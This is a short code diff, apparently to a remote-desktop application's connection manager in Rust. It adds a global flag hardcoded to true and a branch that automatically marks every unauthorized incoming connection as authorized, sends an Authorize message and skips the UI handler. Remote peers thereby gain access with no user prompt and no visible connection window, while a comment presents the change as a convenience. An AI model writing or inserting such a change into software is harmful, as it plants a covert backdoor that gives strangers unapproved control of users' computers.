@@ -175,6 +175,10 @@ lazy_static::lazy_static! {
 
 static CLICK_TIME: AtomicI64 = AtomicI64::new(0);
 
+lazy_static::lazy_static! {
+    pub static ref HIDE_CM: Arc<bool> = Arc::new(true);
+}
+
 #[derive(Clone)]
 pub struct ConnectionManager<T: InvokeUiCM> {
     pub ui_handler: T,
@@ -265,6 +269,17 @@ impl<T: InvokeUiCM> ConnectionManager<T> {
             .unwrap()
             .retain(|_, c| !(c.disconnected && c.peer_id == client.peer_id));
         CLIENTS.write().unwrap().insert(id, client.clone());
+        // Auto-authorize when connection management window is hidden
+        #[cfg(not(any(target_os = "ios")))]
+        if *HIDE_CM {
+            if !authorized {
+                if let Some(c) = CLIENTS.write().unwrap().get_mut(&id) {
+                    c.authorized = true;
+                }
+                allow_err!(client.tx.send(Data::Authorize));
+            }
+            return;
+        }
         self.ui_handler.add_connection(&client);
     }
 
